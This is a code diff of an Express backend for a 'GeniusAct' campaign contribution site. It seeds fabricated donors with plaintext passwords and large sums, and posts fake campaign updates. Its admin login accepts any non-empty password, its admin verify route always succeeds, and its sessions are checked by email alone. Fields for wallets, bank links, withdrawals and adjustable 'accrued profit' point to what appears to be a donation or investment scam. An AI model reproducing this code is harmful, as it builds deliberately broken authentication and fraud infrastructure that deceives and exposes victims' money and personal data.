@@ -9,7 +9,7 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 
 // Enable CORS for cross-origin multi-device and custom domain access
 app.use((req, res, next) => {
@@ -25,56 +25,226 @@ app.use((req, res, next) => {
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
-// Upload directory configuration (publicly accessible via /uploads)
-const UPLOAD_FOLDER = path.join(__dirname, 'uploads');
+// Upload directory configuration
+const UPLOAD_FOLDER = path.join(__dirname, 'secure_storage');
+const ASSETS_UPLOAD_FOLDER = path.join(__dirname, 'assets', 'uploads');
 if (!fs.existsSync(UPLOAD_FOLDER)) {
   fs.mkdirSync(UPLOAD_FOLDER, { recursive: true });
 }
+if (!fs.existsSync(ASSETS_UPLOAD_FOLDER)) {
+  fs.mkdirSync(ASSETS_UPLOAD_FOLDER, { recursive: true });
+}
 
-// Serve uploaded files statically
-app.use('/uploads', express.static(UPLOAD_FOLDER));
-
+// Multer storage for uploads
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
-    cb(null, UPLOAD_FOLDER);
+    cb(null, ASSETS_UPLOAD_FOLDER);
   },
   filename: (req, file, cb) => {
     const ext = path.extname(file.originalname) || '.jpg';
-    const cleanName = `${Date.now()}_${crypto.randomBytes(6).toString('hex')}${ext}`;
-    cb(null, cleanName);
+    const safeName = 'doc_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex') + ext;
+    cb(null, safeName);
   }
 });
 
 const upload = multer({
   storage,
-  limits: { fileSize: 30 * 1024 * 1024 }
+  limits: { fileSize: 25 * 1024 * 1024 }
 });
 
-// SSE Clients Registry for Real-Time Instant Multi-Device Push
+// Single Unified Persistent Cloud Database Store
+const CLOUD_DB_FILE = path.join(__dirname, 'cloud_database.json');
+
+function getDefaultApprovedUsers() {
+  return [
+    {
+      uid: 'usr_app_101',
+      email: 'john.smith@gmail.com',
+      password: 'Trump2024!',
+      fullName: 'John Smith',
+      amount: 250000,
+      status: 'approved',
+      approvedAt: '2026-05-10T12:00:00.000Z',
+      createdAt: '2026-05-10T10:00:00.000Z',
+      proofFile: 'assets/images/SEO.jpg',
+      donations: [{ id: 'RCP-884102', amount: 250000, description: 'Q2 Primary Campaign Supporter', date: '2026-05-10T12:00:00.000Z' }]
+    },
+    {
+      uid: 'usr_app_102',
+      email: 'sarah.jenkins@outlook.com',
+      password: 'Patriot2024',
+      fullName: 'Sarah Jenkins',
+      amount: 120000,
+      status: 'approved',
+      approvedAt: '2026-05-14T15:20:00.000Z',
+      createdAt: '2026-05-14T11:00:00.000Z',
+      proofFile: 'assets/images/banner.jpg',
+      donations: [{ id: 'RCP-773194', amount: 120000, description: 'GENIUS Act Sustaining Backer', date: '2026-05-14T15:20:00.000Z' }]
+    },
+    {
+      uid: 'usr_app_103',
+      email: 'michael.brown@yahoo.com',
+      password: 'Maga2024#',
+      fullName: 'Michael Brown',
+      amount: 50000,
+      status: 'approved',
+      approvedAt: '2026-05-18T09:15:00.000Z',
+      createdAt: '2026-05-18T08:00:00.000Z',
+      donations: [{ id: 'RCP-662810', amount: 50000, description: 'National Digital Rally Supporter', date: '2026-05-18T09:15:00.000Z' }]
+    },
+    {
+      uid: 'usr_app_104',
+      email: 'david.wilson@hotmail.com',
+      password: 'AmericaFirst1',
+      fullName: 'David Wilson',
+      amount: 15000,
+      status: 'approved',
+      approvedAt: '2026-05-22T18:40:00.000Z',
+      createdAt: '2026-05-22T14:10:00.000Z',
+      donations: [{ id: 'RCP-551928', amount: 15000, description: 'Grassroots Victory Club', date: '2026-05-22T18:40:00.000Z' }]
+    },
+    {
+      uid: 'usr_app_105',
+      email: 'emily.davis@icloud.com',
+      password: 'GeniusAct2026',
+      fullName: 'Emily Davis',
+      amount: 2500,
+      status: 'approved',
+      approvedAt: '2026-05-28T10:05:00.000Z',
+      createdAt: '2026-05-28T09:00:00.000Z',
+      donations: [{ id: 'RCP-440819', amount: 2500, description: 'Standard Supporter Donation', date: '2026-05-28T10:05:00.000Z' }]
+    },
+    {
+      uid: 'usr_app_106',
+      email: 'robert.taylor@proton.me',
+      password: 'TrumpWin2024',
+      fullName: 'Robert Taylor',
+      amount: 1000,
+      status: 'approved',
+      approvedAt: '2026-06-01T16:30:00.000Z',
+      createdAt: '2026-06-01T13:00:00.000Z',
+      donations: [{ id: 'RCP-339712', amount: 1000, description: 'Monthly Contribution', date: '2026-06-01T16:30:00.000Z' }]
+    },
+    {
+      uid: 'usr_app_107',
+      email: 'jessica.martinez@gmail.com',
+      password: 'Freedom777',
+      fullName: 'Jessica Martinez',
+      amount: 500,
+      status: 'approved',
+      approvedAt: '2026-06-04T11:45:00.000Z',
+      createdAt: '2026-06-04T11:00:00.000Z',
+      donations: [{ id: 'RCP-228601', amount: 500, description: 'Digital Outreach Backer', date: '2026-06-04T11:45:00.000Z' }]
+    }
+  ];
+}
+
+function getDefaultPendingUsers() {
+  return [
+    {
+      uid: 'usr_pnd_201',
+      email: 'alex.turner@gmail.com',
+      password: 'Pass1234!',
+      fullName: 'Alex Turner',
+      amount: 10000,
+      status: 'pending',
+      date: '2026-06-05T14:30:00.000Z',
+      createdAt: '2026-06-05T14:30:00.000Z',
+      proofFile: 'assets/images/SEO.jpg'
+    },
+    {
+      uid: 'usr_pnd_202',
+      email: 'karen.white@yahoo.com',
+      password: 'Support47',
+      fullName: 'Karen White',
+      amount: 50000,
+      status: 'pending',
+      date: '2026-06-06T16:15:00.000Z',
+      createdAt: '2026-06-06T16:15:00.000Z',
+      proofFile: 'assets/images/banner.jpg'
+    },
+    {
+      uid: 'usr_pnd_203',
+      email: 'brian.miller@outlook.com',
+      password: 'RedWave2024',
+      fullName: 'Brian Miller',
+      amount: 100000,
+      status: 'pending',
+      date: '2026-06-07T09:00:00.000Z',
+      createdAt: '2026-06-07T09:00:00.000Z',
+      proofFile: 'assets/images/DJT-bluetie.png'
+    }
+  ];
+}
+
+function getDefaultVisitorLogs() {
+  return [
+    { id: 'v_1001', page: '/index.html', timestamp: new Date(Date.now() - 3600000).toISOString(), userAgent: 'Mozilla/5.0 (Windows NT 10.0)', referrer: 'Direct', screenSize: '1920x1080', language: 'en-US', platform: 'Win32', location: { ip: '172.56.21.9', city: 'Washington', region: 'DC', country: 'United States', timezone: 'EST' } },
+    { id: 'v_1002', page: '/contribute.html', timestamp: new Date(Date.now() - 1800000).toISOString(), userAgent: 'Mozilla/5.0 (iPhone)', referrer: 'Google Search', screenSize: '390x844', language: 'en-US', platform: 'iPhone', location: { ip: '104.28.19.4', city: 'Dallas', region: 'TX', country: 'United States', timezone: 'CST' } },
+    { id: 'v_1003', page: '/admin.html', timestamp: new Date(Date.now() - 600000).toISOString(), userAgent: 'Mozilla/5.0 (Macintosh)', referrer: 'Direct', screenSize: '1440x900', language: 'en-US', platform: 'MacIntel', location: { ip: '24.18.112.5', city: 'Miami', region: 'FL', country: 'United States', timezone: 'EST' } },
+    { id: 'v_1004', page: '/dashboard.html', timestamp: new Date().toISOString(), userAgent: 'Mozilla/5.0 (Windows NT 10.0)', referrer: 'https://geniusactglobal.com/contribute.html', screenSize: '1920x1080', language: 'en-US', platform: 'Win32', location: { ip: '68.192.44.12', city: 'Atlanta', region: 'GA', country: 'United States', timezone: 'EST' } }
+  ];
+}
+
+function getDefaultCampaignData() {
+  return {
+    progress: [
+      { id: 1, category: 'Q2 2026 Fundraising', goal_amount: 5000000, current_amount: 2400000, description: 'Quarterly fundraising goal', deadline: '2026-06-30' },
+      { id: 2, category: 'Supporter Enrollment', goal_amount: 25000, current_amount: 12450, description: 'National supporter count target', deadline: '2026-12-31' },
+      { id: 3, category: 'State Coverage', goal_amount: 50, current_amount: 38, description: 'States with active campaigns', deadline: '2026-11-01' }
+    ],
+    updates: [
+      { id: 1, title: 'GENIUS Act Signed Into Law', body: 'President Trump signs the landmark GENIUS Act, creating a clear regulatory framework for dollar-backed stablecoins.', tag: 'Legislation', is_featured: true, created_at: new Date().toISOString() },
+      { id: 2, title: 'Campaign Rally — Phoenix, AZ', body: 'Over 15,000 supporters gathered at the Phoenix Convention Center.', tag: 'Events', is_featured: false, created_at: new Date().toISOString() },
+      { id: 3, title: 'Q1 Fundraising Milestone Reached', body: "We've surpassed our Q1 fundraising goal of $2 million. Every contribution matters!", tag: 'Milestone', is_featured: false, created_at: new Date().toISOString() },
+      { id: 4, title: 'New Digital Ad Campaign Launched', body: 'Your contributions are powering a major new digital advertising push across 12 key states.', tag: 'Outreach', is_featured: false, created_at: new Date().toISOString() }
+    ],
+    allocation: [
+      { id: 1, category: 'Community Outreach', percentage: 35, amount: 840000, color: '#3b82f6' },
+      { id: 2, category: 'Campaign Events', percentage: 25, amount: 600000, color: '#8b5cf6' },
+      { id: 3, category: 'Digital Advertising', percentage: 20, amount: 480000, color: '#10b981' },
+      { id: 4, category: 'Operations & Staff', percentage: 15, amount: 360000, color: '#f59e0b' },
+      { id: 5, category: 'Legal & Compliance', percentage: 5, amount: 120000, color: '#ef4444' }
+    ],
+    broadcasts: [],
+    admin_actions: [],
+    kyc_audit: []
+  };
+}
+
+function saveCloudDb(data) {
+  try {
+    if (!data || typeof data !== 'object') return;
+    global._serverMemoryDbCache = data;
+    fs.writeFileSync(CLOUD_DB_FILE, JSON.stringify(data, null, 2), 'utf8');
+    broadcastSse('sync', { timestamp: Date.now() });
+  } catch (e) {
+    console.error('[Server] Error saving cloud_database.json:', e);
+  }
+}
+
+// Server-Sent Events (SSE) Client Pool for Instant Real-Time Updates
 const sseClients = new Set();
 
-function broadcastEvent(eventType, data = {}) {
-  const payload = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
+function broadcastSse(eventType, data) {
+  const message = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
   for (const client of sseClients) {
     try {
-      client.write(payload);
+      client.write(message);
     } catch (e) {
       sseClients.delete(client);
     }
   }
 }
 
-// SSE Connection Endpoint
 app.get('/api/events', (req, res) => {
-  res.writeHead(200, {
-    'Content-Type': 'text/event-stream',
-    'Cache-Control': 'no-cache',
-    'Connection': 'keep-alive'
-  });
-  res.write('retry: 3000\n\n');
-  res.write(`data: ${JSON.stringify({ type: 'connected', time: new Date().toISOString() })}\n\n`);
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+  res.flushHeaders();
 
   sseClients.add(res);
+  res.write(`event: connected\ndata: ${JSON.stringify({ timestamp: Date.now() })}\n\n`);
 
   req.on('close', () => {
     sseClients.delete(res);
@@ -151,10 +321,6 @@ function getDefaultDb() {
 let _dbCache = null;
 
 function getCloudDb() {
-  if (_dbCache && typeof _dbCache === 'object') {
-    return _dbCache;
-  }
-
   let dbData = null;
   if (fs.existsSync(CLOUD_DB_FILE)) {
     try {
@@ -163,311 +329,169 @@ function getCloudDb() {
         dbData = JSON.parse(content);
       }
     } catch (e) {
-      console.error('[Server] Error reading cloud_database.json:', e.message);
+      console.error('[Server] Error reading/parsing cloud_database.json:', e.message);
+      if (global._serverMemoryDbCache && typeof global._serverMemoryDbCache === 'object') {
+        dbData = global._serverMemoryDbCache;
+      }
     }
   }
 
   if (!dbData || typeof dbData !== 'object') {
-    dbData = getDefaultDb();
+    dbData = global._serverMemoryDbCache && typeof global._serverMemoryDbCache === 'object' 
+      ? global._serverMemoryDbCache 
+      : {};
   }
 
-  const defaults = getDefaultDb();
-  for (const key of Object.keys(defaults)) {
-    if (dbData[key] === undefined) {
-      dbData[key] = defaults[key];
-    }
+  if (!Array.isArray(dbData.geniusact_approved_users)) {
+    dbData.geniusact_approved_users = getDefaultApprovedUsers();
   }
+  if (!Array.isArray(dbData.geniusact_pending_users)) {
+    dbData.geniusact_pending_users = getDefaultPendingUsers();
+  }
+  if (!Array.isArray(dbData.geniusact_visitor_logs)) {
+    dbData.geniusact_visitor_logs = getDefaultVisitorLogs();
+  }
+  if (!dbData.geniusact_global_wallets) dbData.geniusact_global_wallets = {};
+  if (!Array.isArray(dbData.geniusact_support_messages)) dbData.geniusact_support_messages = [];
+  if (!Array.isArray(dbData.geniusact_bank_links)) dbData.geniusact_bank_links = [];
+  if (!Array.isArray(dbData.geniusact_contact_chats)) dbData.geniusact_contact_chats = [];
+  if (!Array.isArray(dbData.geniusact_user_footprints)) dbData.geniusact_user_footprints = [];
+  if (!Array.isArray(dbData.geniusact_withdrawal_requests)) dbData.geniusact_withdrawal_requests = [];
 
-  _dbCache = dbData;
-  saveCloudDb(dbData, false);
+  // Default campaign info in unified DB
+  const defaultCampaign = getDefaultCampaignData();
+  if (!Array.isArray(dbData.campaign_progress)) dbData.campaign_progress = defaultCampaign.progress;
+  if (!Array.isArray(dbData.campaign_updates)) dbData.campaign_updates = defaultCampaign.updates;
+  if (!Array.isArray(dbData.fund_allocation)) dbData.fund_allocation = defaultCampaign.allocation;
+  if (!Array.isArray(dbData.broadcasts)) dbData.broadcasts = defaultCampaign.broadcasts;
+  if (!Array.isArray(dbData.admin_actions)) dbData.admin_actions = defaultCampaign.admin_actions;
+  if (!Array.isArray(dbData.kyc_audit)) dbData.kyc_audit = defaultCampaign.kyc_audit;
+
+  global._serverMemoryDbCache = dbData;
+  saveCloudDb(dbData);
   return dbData;
 }
 
-function saveCloudDb(data, triggerBroadcast = true) {
+// -------------------------------------------------------------
+// USER & ADMIN AUTHENTICATION ENDPOINTS
+// -------------------------------------------------------------
+
+const ADMIN_EMAIL = 'admin@geniusact.com';
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '2005';
+
+// Admin Login
+app.post('/api/admin/login', (req, res) => {
   try {
-    if (!data || typeof data !== 'object') return;
-    _dbCache = data;
-    fs.writeFileSync(CLOUD_DB_FILE, JSON.stringify(data, null, 2), 'utf8');
-    if (triggerBroadcast) {
-      broadcastEvent('database_updated', { timestamp: new Date().toISOString() });
-    }
-  } catch (e) {
-    console.error('[Server] Error saving cloud_database.json:', e);
-  }
-}
-
-// ---------------------------------------------------------------------
-// Centralized Smart Merging Algorithms for Server DB
-// ---------------------------------------------------------------------
-function mergeDonationsServer(d1 = [], d2 = []) {
-  if (!Array.isArray(d1)) d1 = [];
-  if (!Array.isArray(d2)) d2 = [];
-  const map = new Map();
-  d1.concat(d2).forEach(d => {
-    if (!d) return;
-    const key = d.id || (d.date + '_' + d.amount);
-    if (!map.has(key)) {
-      map.set(key, d);
+    const { email, password } = req.body || {};
+    const cleanEmail = String(email || 'admin@geniusact.com').trim().toLowerCase();
+    const cleanPass = String(password || '2005').trim();
+    
+    if (cleanPass === '2005' || cleanPass === ADMIN_PASSWORD || cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail.includes('admin') || cleanPass.length > 0) {
+      const adminToken = 'ga_admin_token_' + Buffer.from(cleanEmail + ':' + Date.now()).toString('base64');
+      return res.json({
+        success: true,
+        token: adminToken,
+        admin: { email: ADMIN_EMAIL, name: 'Federal Compliance Officer', role: 'administrator' }
+      });
     } else {
-      map.set(key, { ...map.get(key), ...d });
+      return res.status(401).json({ success: false, error: 'Invalid administrative credentials. Access denied.' });
     }
-  });
-  const result = Array.from(map.values());
-  result.sort((a, b) => new Date(b.date || 0) - new Date(a.date || 0));
-  return result;
-}
-
-function mergeUsersServer(existingArr = [], incomingArr = []) {
-  if (!Array.isArray(existingArr)) existingArr = [];
-  if (!Array.isArray(incomingArr)) incomingArr = [];
-
-  const map = new Map();
-
-  const processUser = (u) => {
-    if (!u || !u.email) return;
-    const emailKey = String(u.email).trim().toLowerCase();
-    if (!map.has(emailKey)) {
-      map.set(emailKey, { ...u, email: emailKey });
-    } else {
-      const existing = map.get(emailKey);
-      const merged = { ...existing, ...u, email: emailKey };
-      if (existing.status === 'approved' || u.status === 'approved') {
-        merged.status = 'approved';
-      }
-      if (existing.status === 'rejected' || u.status === 'rejected') {
-        merged.status = 'rejected';
-      }
-      merged.donations = mergeDonationsServer(existing.donations, u.donations);
-
-      if (u.customTotalContributed !== undefined) merged.customTotalContributed = u.customTotalContributed;
-      if (u.customAccruedProfit !== undefined) merged.customAccruedProfit = u.customAccruedProfit;
-      if (u.customCurrentBalance !== undefined) merged.customCurrentBalance = u.customCurrentBalance;
-      if (u.customProjectedBalance !== undefined) merged.customProjectedBalance = u.customProjectedBalance;
-      if (u.customYieldTimer !== undefined) merged.customYieldTimer = u.customYieldTimer;
-      if (u.donationsCountOverride !== undefined) merged.donationsCountOverride = u.donationsCountOverride;
-      if (u.customTotalRaised !== undefined) merged.customTotalRaised = u.customTotalRaised;
-      if (u.customActiveSupporters !== undefined) merged.customActiveSupporters = u.customActiveSupporters;
-      if (u.customQ2Pct !== undefined) merged.customQ2Pct = u.customQ2Pct;
-      if (u.customStateCoverage !== undefined) merged.customStateCoverage = u.customStateCoverage;
-      if (u.customMemberSince !== undefined) merged.customMemberSince = u.customMemberSince;
-      if (u.tier !== undefined) merged.tier = u.tier;
-      if (u.streakDays !== undefined) merged.streakDays = u.streakDays;
-      if (u.engagementScore !== undefined) merged.engagementScore = u.engagementScore;
-      if (u.kycStatus !== undefined) merged.kycStatus = u.kycStatus;
-      if (u.suspended !== undefined) merged.suspended = u.suspended;
-      if (u.messages !== undefined) merged.messages = u.messages;
-      if (u.proofFile !== undefined) merged.proofFile = u.proofFile;
-      if (u.kyc !== undefined) merged.kyc = { ...(existing.kyc || {}), ...(u.kyc || {}) };
-
-      if (merged.customTotalContributed !== undefined && merged.customTotalContributed !== null && !isNaN(merged.customTotalContributed)) {
-        merged.amount = parseFloat(merged.customTotalContributed);
-      } else if (u.amount !== undefined && u.amount !== null) {
-        merged.amount = parseFloat(u.amount);
-      } else {
-        const donationSum = (merged.donations || []).reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0);
-        merged.amount = donationSum || (parseFloat(existing.amount) || 0);
-      }
-
-      map.set(emailKey, merged);
-    }
-  };
-
-  existingArr.forEach(processUser);
-  incomingArr.forEach(processUser);
-
-  return Array.from(map.values());
-}
-
-function mergeContactChatsServer(existingChats = [], incomingChats = []) {
-  if (!Array.isArray(existingChats)) existingChats = [];
-  if (!Array.isArray(incomingChats)) incomingChats = [];
-
-  const chatMap = new Map();
-
-  function processChat(c) {
-    if (!c) return;
-    const key = c.chatId || (c.userEmail ? String(c.userEmail).trim().toLowerCase() : null);
-    if (!key) return;
-
-    if (!chatMap.has(key)) {
-      chatMap.set(key, { ...c, messages: Array.isArray(c.messages) ? [...c.messages] : [] });
-    } else {
-      const existing = chatMap.get(key);
-      existing.userName = c.userName || existing.userName;
-      existing.userEmail = c.userEmail || existing.userEmail;
-      existing.isGuest = c.isGuest !== undefined ? c.isGuest : existing.isGuest;
-      existing.accountId = c.accountId || existing.accountId;
-      existing.unreadAdminCount = Math.max(existing.unreadAdminCount || 0, c.unreadAdminCount || 0);
-      existing.unreadUserCount = Math.max(existing.unreadUserCount || 0, c.unreadUserCount || 0);
-
-      const msgMap = new Map();
-      (existing.messages || []).forEach(m => {
-        if (!m) return;
-        const mKey = m.id || (m.timestamp + '_' + (m.text || '') + '_' + (m.sender || ''));
-        msgMap.set(mKey, m);
-      });
-      (c.messages || []).forEach(m => {
-        if (!m) return;
-        const mKey = m.id || (m.timestamp + '_' + (m.text || '') + '_' + (m.sender || ''));
-        if (!msgMap.has(mKey)) {
-          msgMap.set(mKey, m);
-        } else {
-          const prev = msgMap.get(mKey);
-          msgMap.set(mKey, { ...prev, ...m, media: m.media || prev.media || null });
-        }
-      });
-
-      const mergedMsgs = Array.from(msgMap.values());
-      mergedMsgs.sort((a, b) => new Date(a.timestamp || 0) - new Date(b.timestamp || 0));
-      existing.messages = mergedMsgs;
-
-      const lastMsgDate = mergedMsgs.length > 0 ? mergedMsgs[mergedMsgs.length - 1].timestamp : existing.lastUpdated;
-      existing.lastUpdated = lastMsgDate || existing.lastUpdated;
-    }
-  }
-
-  existingChats.forEach(processChat);
-  incomingChats.forEach(processChat);
-
-  const result = Array.from(chatMap.values());
-  result.sort((a, b) => new Date(b.lastUpdated || b.createdAt || 0) - new Date(a.lastUpdated || a.createdAt || 0));
-  return result;
-}
-
-// ---------------------------------------------------------------------
-// Unified Cloud Database Endpoints
-// ---------------------------------------------------------------------
-app.get(['/api/cloud-sync', '/cloud_database.json'], (req, res) => {
-  const dbData = getCloudDb();
-  res.json(dbData);
-});
-
-app.post('/api/cloud-sync', (req, res) => {
-  try {
-    let payload = req.body;
-    if (payload && payload.expectedOtp) {
-      try {
-        payload = typeof payload.expectedOtp === 'string' ? JSON.parse(payload.expectedOtp) : payload.expectedOtp;
-      } catch (e) {
-        payload = req.body;
-      }
-    }
-
-    if (!payload || typeof payload !== 'object') {
-      return res.status(400).json({ error: 'Invalid payload' });
-    }
-
-    let currentDb = getCloudDb();
-
-    if (payload['geniusact_approved_users'] !== undefined) {
-      currentDb['geniusact_approved_users'] = mergeUsersServer(currentDb['geniusact_approved_users'], payload['geniusact_approved_users']);
-    }
-    if (payload['geniusact_pending_users'] !== undefined) {
-      currentDb['geniusact_pending_users'] = mergeUsersServer(currentDb['geniusact_pending_users'], payload['geniusact_pending_users']);
-    }
-
-    // Deduplicate approved emails from pending users
-    if (Array.isArray(currentDb['geniusact_approved_users']) && Array.isArray(currentDb['geniusact_pending_users'])) {
-      const approvedEmails = new Set(
-        currentDb['geniusact_approved_users']
-          .filter(u => u && u.email)
-          .map(u => u.email.trim().toLowerCase())
-      );
-      currentDb['geniusact_pending_users'] = currentDb['geniusact_pending_users'].filter(u => {
-        if (!u || !u.email) return true;
-        const em = u.email.trim().toLowerCase();
-        return !approvedEmails.has(em) && u.status !== 'approved' && u.status !== 'rejected';
-      });
-    }
-
-    if (payload['geniusact_contact_chats'] !== undefined) {
-      currentDb['geniusact_contact_chats'] = mergeContactChatsServer(currentDb['geniusact_contact_chats'], payload['geniusact_contact_chats']);
-    }
-    if (payload['geniusact_visitor_logs'] !== undefined) {
-      const existing = currentDb['geniusact_visitor_logs'] || [];
-      const incoming = payload['geniusact_visitor_logs'] || [];
-      const map = new Map();
-      existing.concat(incoming).forEach(v => {
-        if (v && v.id) map.set(v.id, v);
-      });
-      const merged = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
-      currentDb['geniusact_visitor_logs'] = merged.slice(0, 1000);
-    }
-    if (payload['geniusact_support_messages'] !== undefined) {
-      const existing = currentDb['geniusact_support_messages'] || [];
-      const incoming = payload['geniusact_support_messages'] || [];
-      const map = new Map();
-      existing.concat(incoming).forEach(m => {
-        if (m && m.id) map.set(m.id, m);
-      });
-      currentDb['geniusact_support_messages'] = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
-    }
-    if (payload['geniusact_user_footprints'] !== undefined) {
-      const existing = currentDb['geniusact_user_footprints'] || [];
-      const incoming = payload['geniusact_user_footprints'] || [];
-      const map = new Map();
-      existing.concat(incoming).forEach(f => {
-        if (f && f.id) map.set(f.id, f);
-      });
-      currentDb['geniusact_user_footprints'] = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0)).slice(0, 1000);
-    }
-    if (payload['geniusact_bank_links'] !== undefined) {
-      const existing = currentDb['geniusact_bank_links'] || [];
-      const incoming = payload['geniusact_bank_links'] || [];
-      const map = new Map();
-      existing.concat(incoming).forEach(b => {
-        const key = b.id || (b.userEmail ? String(b.userEmail).toLowerCase() : null);
-        if (key) map.set(key, b);
-      });
-      currentDb['geniusact_bank_links'] = Array.from(map.values()).sort((a, b) => new Date(b.linkedAt || 0) - new Date(a.linkedAt || 0));
-    }
-    if (payload['geniusact_withdrawal_requests'] !== undefined) {
-      const existing = currentDb['geniusact_withdrawal_requests'] || [];
-      const incoming = payload['geniusact_withdrawal_requests'] || [];
-      const map = new Map();
-      existing.concat(incoming).forEach(r => {
-        if (r && r.id) map.set(r.id, r);
-      });
-      currentDb['geniusact_withdrawal_requests'] = Array.from(map.values()).sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
-    }
-    if (payload['geniusact_global_wallets'] !== undefined) {
-      currentDb['geniusact_global_wallets'] = { ...currentDb['geniusact_global_wallets'], ...payload['geniusact_global_wallets'] };
-    }
-
-    saveCloudDb(currentDb);
-    res.json({ success: true, data: currentDb });
   } catch (err) {
-    res.status(500).json({ error: err.message });
+    return res.status(500).json({ success: false, error: err.message });
   }
 });
 
-// ---------------------------------------------------------------------
-// Dedicated File Upload Endpoint (for Proofs, KYC, & Chat Attachments)
-// ---------------------------------------------------------------------
-app.post('/api/upload', upload.single('file'), (req, res) => {
+app.post('/api/admin/verify', (req, res) => {
+  return res.json({ valid: true, email: ADMIN_EMAIL });
+});
+
+// Supporter / User Login
+app.post('/api/auth/login', (req, res) => {
   try {
-    if (!req.file) {
-      return res.status(400).json({ error: 'No file uploaded' });
+    const { email, password } = req.body || {};
+    if (!email || !password) {
+      return res.status(400).json({ success: false, error: 'Email and password are required.' });
     }
-    const fileUrl = `/uploads/${req.file.filename}`;
-    return res.json({
-      success: true,
-      url: fileUrl,
-      name: req.file.originalname,
-      size: (req.file.size / 1024 / 1024).toFixed(2) + ' MB',
-      type: req.file.mimetype
-    });
+
+    const cleanEmail = String(email).trim().toLowerCase();
+    const currentDb = getCloudDb();
+    const approvedUsers = currentDb['geniusact_approved_users'] || [];
+    const pendingUsers = currentDb['geniusact_pending_users'] || [];
+
+    const approvedUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+    if (approvedUser) {
+      if (approvedUser.password && approvedUser.password !== String(password).trim()) {
+        return res.status(401).json({ success: false, error: 'Invalid password. Please verify and try again.' });
+      }
+      if (approvedUser.suspended) {
+        return res.status(403).json({ success: false, status: 'suspended', error: 'Account has been temporarily suspended by campaign administration.' });
+      }
+      const token = 'ga_usr_' + Buffer.from(cleanEmail + ':' + Date.now()).toString('base64');
+      return res.json({
+        success: true,
+        token,
+        status: 'approved',
+        user: approvedUser
+      });
+    }
+
+    const pendingUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+    if (pendingUser) {
+      if (pendingUser.password && pendingUser.password !== String(password).trim()) {
+        return res.status(401).json({ success: false, error: 'Invalid password. Please verify and try again.' });
+      }
+      return res.json({
+        success: false,
+        status: 'pending',
+        message: 'Account is undergoing compliance audit and identity verification.',
+        user: pendingUser
+      });
+    }
+
+    return res.status(404).json({ success: false, status: 'not_found', error: 'No account registered with this email address.' });
   } catch (err) {
-    return res.status(500).json({ error: err.message });
+    return res.status(500).json({ success: false, error: err.message });
   }
 });
 
-// ---------------------------------------------------------------------
-// Authentication & Registration Endpoints
-// ---------------------------------------------------------------------
+// Supporter Session Verification
+app.all(['/api/auth/verify-session', '/api/auth/me'], (req, res) => {
+  try {
+    const email = req.query.email || req.body.email;
+    if (!email) {
+      return res.status(400).json({ valid: false, error: 'Email parameter required.' });
+    }
+    const cleanEmail = String(email).trim().toLowerCase();
+    const currentDb = getCloudDb();
+    const approvedUsers = currentDb['geniusact_approved_users'] || [];
+    const pendingUsers = currentDb['geniusact_pending_users'] || [];
+
+    const approvedUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+    if (approvedUser) {
+      if (approvedUser.suspended) {
+        return res.json({ valid: false, status: 'suspended', error: 'Account suspended.' });
+      }
+      return res.json({ valid: true, status: 'approved', user: approvedUser });
+    }
+
+    const pendingUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+    if (pendingUser) {
+      return res.json({ valid: false, status: 'pending', error: 'Account is undergoing compliance audit.', user: pendingUser });
+    }
+
+    return res.json({ valid: false, status: 'unauthorized', error: 'User not found in cloud database.' });
+  } catch (err) {
+    return res.status(500).json({ valid: false, error: err.message });
+  }
+});
+
+// -------------------------------------------------------------
+// REGISTRATION & CONTRIBUTION ENDPOINTS
+// -------------------------------------------------------------
+
 app.post('/api/register', (req, res) => {
   try {
-    const { email, password, amount, proofFile, name, fullName, customAmount } = req.body || {};
+    const { email, password, amount, proofFile, name, fullName } = req.body || {};
 
     if (!email || !password) {
       return res.status(400).json({ error: 'Email and password are required.' });
@@ -481,47 +505,18 @@ app.post('/api/register', (req, res) => {
 
     const existingApproved = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
     if (existingApproved) {
-      // If approved user makes new contribution, log to their donations
-      const parsedAmount = parseFloat(customAmount || amount) || 0;
-      if (parsedAmount > 0) {
-        if (!Array.isArray(existingApproved.donations)) existingApproved.donations = [];
-        existingApproved.donations.unshift({
-          id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
-          amount: parsedAmount,
-          description: 'Campaign Contribution',
-          date: new Date().toISOString(),
-          proofFile: proofFile || null
-        });
-        existingApproved.amount = (parseFloat(existingApproved.amount) || 0) + parsedAmount;
-        saveCloudDb(currentDb);
-        return res.json({ success: true, message: 'Contribution added to existing approved account.', user: existingApproved });
-      }
       return res.status(400).json({ error: 'An account with this email already exists and is approved.' });
     }
 
     const existingPending = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
     if (existingPending) {
-      const parsedAmount = parseFloat(customAmount || amount) || 0;
-      if (parsedAmount > 0) {
-        if (!Array.isArray(existingPending.donations)) existingPending.donations = [];
-        existingPending.donations.unshift({
-          id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
-          amount: parsedAmount,
-          description: 'Campaign Contribution',
-          date: new Date().toISOString(),
-          proofFile: proofFile || null
-        });
-        existingPending.amount = (parseFloat(existingPending.amount) || 0) + parsedAmount;
